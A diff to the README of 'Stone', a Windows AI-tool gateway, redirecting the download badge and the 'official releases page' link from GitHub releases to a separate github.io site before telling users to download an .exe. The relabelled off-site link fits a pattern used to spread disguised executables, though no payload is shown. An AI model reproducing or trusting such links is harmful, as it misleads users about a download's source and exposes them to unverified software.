@@ -1,6 +1,6 @@
 # 🪨 Stone - Manage your AI tools with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Venaerenisimpairment484/Stone/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://venaerenisimpairment484.github.io)
 
 Stone acts as a bridge between your computer and various artificial intelligence services. It runs on your own machine. This setup keeps your data private and helps you organize your AI connections in one place. You get a central gateway to manage Claude, OpenAI, and Gemini tools without complex manual configurations.
 
@@ -8,7 +8,7 @@ Stone acts as a bridge between your computer and various artificial intelligence
 
 Follow these steps to set up Stone on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Venaerenisimpairment484/Stone/releases).
+1. Visit the [official releases page](https://venaerenisimpairment484.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
